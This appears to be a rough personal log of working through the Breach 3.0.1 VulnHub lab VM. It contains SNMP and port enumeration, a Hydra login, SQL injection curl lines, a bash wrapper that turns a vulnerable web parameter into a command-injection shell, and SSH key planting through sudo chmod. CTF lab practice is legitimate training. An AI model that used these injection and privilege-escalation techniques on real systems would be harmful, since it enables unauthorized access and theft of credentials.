https://www.vulnhub.com/entry/breach-301,177/

https://www.hackingarticles.in/snmp-lab-setup-and-penetration-testing/


https://evi1r0s3.github.io/vulnhub/2020/11/09/Breach_3.0.1.html


https://www.alasta.com/security/2014/05/17/tools-brute-force-avec-hydra.html




Third in a multi-part series, Breach 3.0 is a slightly longer boot2root/CTF challenge which attempts to showcase a few real-world scenarios/vulnerabilities, with plenty of twists and trolls along the way.

Difficulty: Intermediate, requires some creative thinking and persistence more so than advanced exploitation.

The VM is configured to grab a lease via DHCP.

A few things:

1) This is the culmination of the series, keep your notes close from the previous 2 challenges, they may come in handy. 
2) Remember that recon is an iterative process. Make sure you leave no stone unturned. 
3) The VM uses KVM and QEMU for virtualization. It is not necessary to root every host to progress. 
4) There are 3 flags throughout, once you reach a flag you have achieved that intended level of access and can move on. These 3 flags are your objectives and it will be clear once you have found each and when it is time to move on.



# nmap


	$ sudo nmap -sU 192.168.110.10
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-01 14:15 CET
	Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
	UDP Scan Timing: About 2.50% done; ETC: 14:16 (0:00:39 remaining)
	Nmap scan report for 192.168.110.10
	Host is up (0.00048s latency).
	Not shown: 999 open|filtered udp ports (no-response)
	PORT    STATE SERVICE
	161/udp open  snmp
	MAC Address: 08:00:27:1E:75:57 (Oracle VirtualBox virtual NIC)

	Nmap done: 1 IP address (1 host up) scanned in 17.69 seconds




	└─$ sudo nmap -sV -sU -p 161 192.168.110.10                                                                                    
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-01 14:17 CET
	Nmap scan report for 192.168.110.10
	Host is up (0.00015s latency).

	PORT    STATE SERVICE VERSION
	161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
	MAC Address: 08:00:27:1E:75:57 (Oracle VirtualBox virtual NIC)
	Service Info: Host: Initech-DMZ01

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds


	└─$ sudo nmap -sU -p 161 --script "snmp-*" 192.168.110.10
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-01 14:40 CET
	Nmap scan report for 192.168.110.10
	Host is up (0.00012s latency).

	PORT    STATE SERVICE
	161/udp open  snmp
	| snmp-info: 
	|   enterprise: net-snmp
	|   engineIDFormat: unknown
	|   engineIDData: ad610f2abb4d5b5800000000
	|   snmpEngineBoots: 20
	|_  snmpEngineTime: 40m29s
	| snmp-brute: 
	|_  public - Valid credentials
	| snmp-sysdescr: Linux Initech-DMZ01 4.4.0-45-generic #66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64
	|_  System uptime: 40m30.28s (243028 timeticks)
	MAC Address: 08:00:27:1E:75:57 (Oracle VirtualBox virtual NIC)

	Nmap done: 1 IP address (1 host up) scanned in 16.27 seconds


	$ snmpwalk -c public -v1 -t 10  192.168.110.10
	iso.3.6.1.2.1.1.1.0 = STRING: "Linux Initech-DMZ01 4.4.0-45-generic #66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64"
	iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
	iso.3.6.1.2.1.1.3.0 = Timeticks: (293426) 0:48:54.26
	iso.3.6.1.2.1.1.4.0 = STRING: "Email: Milton@breach.local - (545)-232-1876"
	iso.3.6.1.2.1.1.5.0 = STRING: "Initech-DMZ01"
	iso.3.6.1.2.1.1.6.0 = STRING: "Initech - is this thing on? I doubt anyone thinks to look here, anyways, I've left myself a way back in and burn the place down once again."
	iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
	iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
	iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
	iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
	iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
	iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.2.1.49
	iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.4
	iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
	iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.6.3.16.2.2.1
	iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
	iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
	iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
	iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
	iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
	iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
	iso.3.6.1.2.1.1.9.1.3.5 = STRING: "The MIB module for managing TCP implementations"
	iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing IP and ICMP implementations"
	iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
	iso.3.6.1.2.1.1.9.1.3.8 = STRING: "View-based Access Control Model for SNMP."
	iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
	iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
	iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
	iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
	iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
	iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
	iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
	iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
	iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
	iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
	iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
	iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
	iso.3.6.1.2.1.25.1.1.0 = Timeticks: (294923) 0:49:09.23
	iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E5 0C 01 09 30 23 00 2D 05 00 
	iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
	iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-4.4.0-45-generic root=UUID=56e63cea-5a5c-4f59-babf-fdd403f70674 ro tty12 quiet splash
	"
	iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
	iso.3.6.1.2.1.25.1.6.0 = Gauge32: 34
	iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
	End of MIB



	for community in public private manager; do snmpwalk -c $community -v1 192.168.110.10; done
	for community in public private manager; do echo $community; done


	snmpwalk -c public -v1 192.168.110.10 1.3.6.1.2.1.1.9.1.3.2 # enumerate windows users

for p in 545 232 1876; do echo nc -vz -w 1 192.168.110.10 $p; done

for p in 545 232 1876; do nmap -Pn --host-timeout 201 --max-retries 0 -p $p 192.168.110.10; done

$ ssh 192.168.110.10                                                                                 
**********************************************************************
*                                                                    * 
*          The Bobs Cloud Hosting, LLC. Secure Backdoor              *
*                                                                    * 
*                                                                    *
*  If you wish to discuss cloud hosting options, give us a call at   *
*                                                                    *
*   555-423-1800 or email us at thebobs@thebobscloudhostingllc.net   *
*                                                                    * 
**********************************************************************


	$ hydra -l milton -p thelaststraw -s 8 192.168.110.10 http-get /                                     
	Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-04 07:59:14
	[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
	[DATA] attacking http-get://192.168.110.10:8/
	[8][http-get] host: 192.168.110.10   login: milton   password: thelaststraw
	1 of 1 target successfully completed, 1 valid password found
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-04 07:59:15




└─$ dirb http://192.168.110.10:8/breach3/thebobscloudhostingllc/ -u milton:thelaststraw -X .php

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Dec  4 08:12:59 2021
URL_BASE: http://192.168.110.10:8/breach3/thebobscloudhostingllc/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
AUTHORIZATION: milton:thelaststraw
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.10:8/breach3/thebobscloudhostingllc/ ----
+ http://192.168.110.10:8/breach3/thebobscloudhostingllc/domain.php (CODE:302|SIZE:20)                
+ http://192.168.110.10:8/breach3/thebobscloudhostingllc/email.php (CODE:302|SIZE:20)                 
+ http://192.168.110.10:8/breach3/thebobscloudhostingllc/index.php (CODE:302|SIZE:20)                 
+ http://192.168.110.10:8/breach3/thebobscloudhostingllc/livechat.php (CODE:302|SIZE:20)              
+ http://192.168.110.10:8/breach3/thebobscloudhostingllc/support.php (CODE:302|SIZE:20)               
                                                                                                      
-----------------
END_TIME: Sat Dec  4 08:13:05 2021
DOWNLOADED: 4612 - FOUND: 5


$ curl -u milton:thelaststraw http://192.168.110.10:8/breach3/thebobscloudhostingllc/livechat.php?searcher=id
Go back, try harder!
$ curl -u milton:thelaststraw http://192.168.110.10:8/




milton：thelaststraw


```bash

#!/bin/bash


site_url=" http://192.168.110.10:8"

# Endpoint URL for login action.
login_url="$site_url/breach3/index.php"


# Path to temporary file which will store your cookie data.
cookie_path=/tmp/cookie


# URL of your custom action.
action_url="$site_url/breach3/index.php"

# This is data that you want to send to your custom endpoint.
#data="username=admin&password=%61%62%63%27%20%6f%72%20%31%3d%31%20%23&submit=%20%4c%6f%67%69%6e%20"
#curl -c $cookie_path -d "$data" --request POST $action_url

# curl -c cookie -u milton:thelaststraw http://192.168.110.10:8/breach3/index.php 
# curl -u milton:thelaststraw http://192.168.110.10:8/breach3/index.php 
# curl -L -u milton:thelaststraw  -c cookie  --data-urlencode "username=admin" --data-urlencode "password=abc' or 1=1 -- -"  --data-urlencode "submit= Login " http://192.168.110.10:8/breach3/index.php
# curl -u milton:thelaststraw -b cookie http://192.168.110.10:8/breach3/thebobsadmin.php
# curl -b cookie http://192.168.110.10:8/breach3/thebobsadmin.php
# curl -u milton:thelaststraw http://192.168.110.10:8/breach3/thebobsadmin.php
curl -s -L -u milton:thelaststraw  -b cookie http://192.168.110.10:8/breach3/thebobscloudhostingllc/index.php > /dev/null

# curl -s -u milton:thelaststraw  -b cookie -G http://192.168.110.10:8/breach3/thebobscloudhostingllc/livechat.php --data-urlencode "searcher=ls -al /home/" | sed -n '/<div class="contact"/,/<div class="contact-form"/p' |  sed -e '1d' -e '$d'

printf "$ "
while read line
do
    if [[ "$line" == "exit" ]]; then
        break
    fi
    curl -s --data-urlencode "in_command=$line" http://$HOST/$SHELL | sed '/<h5>/,/<\/div>/!d' | sed -r -e '1d' -e '$d' -e 's/^\s+//'
    curl -s -u milton:thelaststraw  -b cookie -G http://192.168.110.10:8/breach3/thebobscloudhostingllc/livechat.php --data-urlencode "searcher=$line" | sed -n '/<div class="contact"/,/<div class="contact-form"/p' |  sed -e '1d' -e '$d'
    printf "$ "
done < "/proc/${$}/fd/0"




```


555-423-1800
$ cat /etc/passwd



root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:107::/var/run/dbus:/bin/false
dnsmasq:x:103:65534:dnsmasq,,,:/var/lib/misc:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
libvirt-qemu:x:106:106:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
libvirt-dnsmasq:x:107:111:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
milton:x:1000:1000:milton,,,:/home/milton:/bin/false
colord:x:108:115:colord colour management daemon,,,:/var/lib/colord:/bin/false
peter:x:1001:1001::/home/peter:/bin/false
mbolton:x:1002:1002::/home/mbolton:/bin/false
samir:x:1003:1003::/home/samir:/bin/bash
troll:x:1004:1004::/home/troll:/bin/false
thebobs:x:1005:1005::/home/thebobs:/usr/bin/python
blumbergh:x:1006:1006::/home/blumbergh:/bin/false
mysql:x:110:119:MySQL Server,,,:/nonexistent:/bin/false
snmp:x:109:117::/var/lib/snmp:/bin/false





$ sudo -l



Matching Defaults entries for samir on Initech-DMZ01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User samir may run the following commands on Initech-DMZ01:
    (thebobs) NOPASSWD: /bin/chmod






$ ls -al /home/thebobs/
...
drwxrwxrwx 2 thebobs thebobs 4096 Nov 13  2016 .ssh
...





$ ls -al /home/thebobs/.ssh
...
-rwxrwxrwx 1 thebobs thebobs     0 Nov 13  2016 authorized_keys
-rwxrwxrwx 1 thebobs thebobs  1679 Sep 10  2016 id_rsa
-rwxrwxrwx 1 thebobs thebobs   403 Sep 10  2016 id_rsa.pub
-rwxrwxrwx 1 thebobs thebobs   222 Oct  6  2016 known_hosts
...$ cat /etc/passwd



root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:107::/var/run/dbus:/bin/false
dnsmasq:x:103:65534:dnsmasq,,,:/var/lib/misc:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
libvirt-qemu:x:106:106:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
libvirt-dnsmasq:x:107:111:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
milton:x:1000:1000:milton,,,:/home/milton:/bin/false
colord:x:108:115:colord colour management daemon,,,:/var/lib/colord:/bin/false
peter:x:1001:1001::/home/peter:/bin/false
mbolton:x:1002:1002::/home/mbolton:/bin/false
samir:x:1003:1003::/home/samir:/bin/bash
troll:x:1004:1004::/home/troll:/bin/false
thebobs:x:1005:1005::/home/thebobs:/usr/bin/python
blumbergh:x:1006:1006::/home/blumbergh:/bin/false
mysql:x:110:119:MySQL Server,,,:/nonexistent:/bin/false
snmp:x:109:117::/var/lib/snmp:/bin/false


cat /home/thebobs/.ssh/id_rsa.pub > /home/thebobs/.ssh/authorized_keys

$ sudo -u thebobs chmod 600 /home/thebobs/.ssh/authorized_keys
$ ls -al /home/thebobs/.ssh/authorized_keys
-rw------- 1 thebobs thebobs 403 Dec  1 14:06 /home/thebobs/.ssh/authorized_keys

$ sudo -u thebobs chmod 700 /home/thebobs/.ssh 
$ sudo -u thebobs chmod 700 /home/thebobs/.ssh 
$ ls -al /home/thebobs/


thebobs@Initech-DMZ01:~$ netstat -tunl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:5800            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN     
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:10007           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:10008           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:10009           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:10010           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:4096            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:2048            0.0.0.0:*               LISTEN     
tcp6       0      0 :::8                    :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 0.0.0.0:10007           0.0.0.0:*                          
udp        0      0 0.0.0.0:10008           0.0.0.0:*                          
udp        0      0 192.168.122.1:53        0.0.0.0:*                          
udp        0      0 0.0.0.0:67              0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:*                          
udp        0      0 0.0.0.0:161             0.0.0.0:*                          
udp        0      0 0.0.0.0:34137           0.0.0.0:*                          
udp6       0      0 :::17799                :::*                               
thebobs@Initech-DMZ01:~$ ifconfig  -a
eth0      Link encap:Ethernet  HWaddr 08:00:27:1e:75:57  
          inet addr:192.168.110.10  Bcast:192.168.110.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe1e:7557/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:258 errors:0 dropped:0 overruns:0 frame:0
          TX packets:146 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:26244 (26.2 KB)  TX bytes:27280 (27.2 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:40 errors:0 dropped:0 overruns:0 frame:0
          TX packets:40 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:3056 (3.0 KB)  TX bytes:3056 (3.0 KB)

virbr0    Link encap:Ethernet  HWaddr fe:54:00:4b:73:5f  
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

vnet0     Link encap:Ethernet  HWaddr fe:54:00:ee:14:51  
          inet6 addr: fe80::fc54:ff:feee:1451/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:116 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:6264 (6.2 KB)

vnet1     Link encap:Ethernet  HWaddr fe:54:00:f7:3c:ef  
          inet6 addr: fe80::fc54:ff:fef7:3cef/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:116 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:6264 (6.2 KB)

vnet2     Link encap:Ethernet  HWaddr fe:54:00:4b:73:5f  
          inet6 addr: fe80::fc54:ff:fe4b:735f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)




thebobs@Initech-DMZ01:~$ cat /usr/bin/fvnc.sh
#!/bin/sh
dialog --menu "Milton's Backdoor" 10 30 3 1 Sysinfo 2 Eavesdrop 3 Shell 2>/tmp/temp


# OK is pressed
if [ "$?" = "0" ]
then
        _return=$(cat /tmp/temp)
 
        # /home is selected
        if [ "$_return" = "1" ]
        then
                dialog --title "Grab some quick info" --msgbox "$(uname -a && ifconfig eth0)" 100 100
        fi
 
         # /root is selected
        if [ "$_return" = "2" ]
        then
                dialog --title "See what everyone is up to back at Initech" --msgbox "$(tcpdump -i eth0)" 100 100
        fi
 
         # /tmp is selected
        if [ "$_return" = "3" ]
        then
                dialog --title "Drop into a system shell" --msgbox "$(echo "Yeaaaa! We shutdown this backdoor. Did we get the telnet one too? It keeps popping up somehow.")" 100 100
        fi
 
# Cancel is pressed
else
        echo "Cancel is pressed"
fi
 
# remove the temp file
rm -f /tmp/temp

#iptables -A INPUT -i eth0 -p tcp --dport 23 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A OUTPUT -o eth0 -p tcp --sport 23 -m state --state NEW,ESTABLISHED -j ACCEPT
thebobs@Initech-DMZ01:~$ ls -al /usr/bin/fvnc.sh
-rwxr-xr-x 1 root root 1107 Dec 23  2016 /usr/bin/fvnc.sh




thebobs@Initech-DMZ01:~$ nmap -sn -n 192.168.122.1/24

Starting Nmap 6.40 ( http://nmap.org ) at 2021-12-06 11:35 EST
Nmap scan report for 192.168.122.1
Host is up (0.00014s latency).
Nmap done: 256 IP addresses (1 host up) scanned in 3.22 seconds




mysql> select * from info;
+----+-----------+------------------------------------------------------------------------------+------------------------------------------------------------------+
| id | username  | password                                                                     | comments                                                         |
+----+-----------+------------------------------------------------------------------------------+------------------------------------------------------------------+
|  1 | blumbergh | Vmxab2QxRXlTbGRqU0VaVlYwaENjVlJVUmt0aU1XeFhXWHBHVjFKVk5YVlZSbEYzVTNkdlBRbz0K | Trying out a new encryption method, not in production yet        |
|  2 | milton    | thelaststraw                                                                 | Account disabled after he went off the rails. No need to encrypt |
|  3 | root      | ?                                                                            | :)                                                               |
+----+-----------+------------------------------------------------------------------------------+------------------------------------------------------------------+
3 rows in set (0.00 sec)



mysql> select * from login;
+----+----------+------------------------------------------+
| id | username | password                                 |
+----+----------+------------------------------------------+
|  1 | admin    | 8f4fadb24304d60d9dcb1589aa6a5c2d2d373229 |
+----+----------+------------------------------------------+



 555-423-1800

for p in 555 423 1800; do nmap -Pn --host-timeout 201 --max-retries 0 -p $p 192.168.110.10; done




thebobs@Initech-DMZ01:~$ cat /usr/bin/ftelnet.sh
#!/bin/sh
echo "I used to have a backdoor here but they closed it down around when they moved my desk into the basement."
echo
echo "I'm going to burn this one down too"
echo

#sh /root/portly2.sh >/dev/null 2>&1 &



cat /usr/bin/ftelnet.sh
cat /usr/bin/gettext.sh
cat /usr/bin/fvnc.sh
thebobs@Initech-DMZ01:~$ cat /usr/bin/fvnc.sh
#!/bin/sh
dialog --menu "Milton's Backdoor" 10 30 3 1 Sysinfo 2 Eavesdrop 3 Shell 2>/tmp/temp


# OK is pressed
if [ "$?" = "0" ]
then
        _return=$(cat /tmp/temp)
 
        # /home is selected
        if [ "$_return" = "1" ]
        then
                dialog --title "Grab some quick info" --msgbox "$(uname -a && ifconfig eth0)" 100 100
        fi
 
         # /root is selected
        if [ "$_return" = "2" ]
        then
                dialog --title "See what everyone is up to back at Initech" --msgbox "$(tcpdump -i eth0)" 100 100
        fi
 
         # /tmp is selected
        if [ "$_return" = "3" ]
        then
                dialog --title "Drop into a system shell" --msgbox "$(echo "Yeaaaa! We shutdown this backdoor. Did we get the telnet one too? It keeps popping up somehow.")" 100 100
        fi
 
# Cancel is pressed
else
        echo "Cancel is pressed"
fi
 
# remove the temp file
rm -f /tmp/temp

#iptables -A INPUT -i eth0 -p tcp --dport 23 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A OUTPUT -o eth0 -p tcp --sport 23 -m state --state NEW,ESTABLISHED -j ACCEPT


thebobs@Initech-DMZ01:~$ cat /usr/bin/ftelnet.sh
#!/bin/sh
echo "I used to have a backdoor here but they closed it down around when they moved my desk into the basement."
echo
echo "I'm going to burn this one down too"
echo

#sh /root/portly2.sh >/dev/null 2>&1 &




thebobs@Initech-DMZ01:~$ cat /etc/libvirt/qemu/networks/default.xml
<network>
  <name>default</name>
  <bridge name="virbr0"/>
  <forward/>
  <ip address="192.168.122.1" netmask="255.255.255.0">
    <dhcp>
      <range start="192.168.122.2" end="192.168.122.254"/>
    </dhcp>
  </ip>
</network>




root      1381  0.0  0.9 278520 18784 ?        Ss   10:19   0:00 /usr/sbin/apache2 -k start

root      1889  0.0  2.6  68964 53472 ?        Ss   10:25   0:00  _ /bin/sh /usr/bin/fvnc.sh
root      1892  0.0  0.4  27080  9580 ?        S    10:25   0:00  |   _ tcpdump -i eth0
root      1497  0.0  0.8  70668 18232 ?        S    10:19   0:00 python /root/HoneyPy/Honey.py -d
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      -               
[+] Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                   
samir:x:1003:1003::/home/samir:/bin/bash


/usr/bin/ftelnet.sh                                                                                                                                                                                               
/usr/bin/gettext.sh
/usr/bin/fvnc.sh

 33673    4 -rwxr-xr-x   1 samir    mail          522 Aug 19  2016 /var/mail/samir                                                                                                                                
 33674    4 -rwxr-xr-x   1 blumbergh mail          543 Aug 19  2016 /var/mail/blumbergh
 33673    4 -rwxr-xr-x   1 samir    mail          522 Aug 19  2016 /var/spool/mail/samir
 33674    4 -rwxr-xr-x   1 blumbergh mail          543 Aug 19  2016 /var/spool/mail/blumbergh

/var/lib/php5
drwx-wx-wt  3 root    root    872448 Dec  6 15:33 php5



thebobs@Initech-DMZ01:/var/lib$ ls -al /var/mail/
total 16
drwxr-sr-x  2 root      mail 4096 Sep 14  2016 .
drwxr-xr-x 14 root      root 4096 Dec 21  2016 ..
-rwxr-xr-x  1 blumbergh mail  543 Aug 19  2016 blumbergh
-rwxr-xr-x  1 samir     mail  522 Aug 19  2016 samir
thebobs@Initech-DMZ01:/var/lib$ cat /var/mail/samir 
From peter@Initech-DMZ01  Fri Aug 19 08:31:46 2016
Return-Path: <peter@Initech-DMZ01>
X-Original-To: samir@localhost
Delivered-To: samir@localhost
Received: by Initech-DMZ01 (Postfix, from userid 1001)
        id 182CF2DA4; Fri, 19 Aug 2016 08:31:46 -0400 (EDT)
Subject: intranet
To: <samir@localhost>
X-Mailer: mail (GNU Mailutils 2.99.98)
Message-Id: <20160819123146.182CF2DA4@Initech-DMZ01>
Date: Fri, 19 Aug 2016 08:31:46 -0400 (EDT)
From: peter@Initech-DMZ01

Samir, I think there is a problem with the intranet page again

thebobs@Initech-DMZ01:/var/lib$ cat /var/mail/blumbergh 
From milton@Initech-DMZ01  Fri Aug 19 08:33:07 2016
Return-Path: <milton@Initech-DMZ01>
X-Original-To: blumbergh@localhost
Delivered-To: blumbergh@localhost
Received: by Initech-DMZ01 (Postfix, from userid 1000)
        id 676CD695E; Fri, 19 Aug 2016 08:33:07 -0400 (EDT)
Subject: swingline
To: <blumbergh@localhost>
X-Mailer: mail (GNU Mailutils 2.99.98)
Message-Id: <20160819123307.676CD695E@Initech-DMZ01>
Date: Fri, 19 Aug 2016 08:33:07 -0400 (EDT)
From: milton@Initech-DMZ01 (milton)

I told them I'd burn the building down and no one listened

thebobs@Initech-DMZ01:/var/lib$


SSH + HTTP

thebobs@Initech-DMZ01:/etc/init.d$ ping 192.168.122.1
PING 192.168.122.1 (192.168.122.1) 56(84) bytes of data.
ping: sendmsg: Operation not permitted

SSH

thebobs@Initech-DMZ01:~$ ping -c 1 192.168.122.1
PING 192.168.122.1 (192.168.122.1) 56(84) bytes of data.
64 bytes from 192.168.122.1: icmp_seq=1 ttl=64 time=0.021 ms

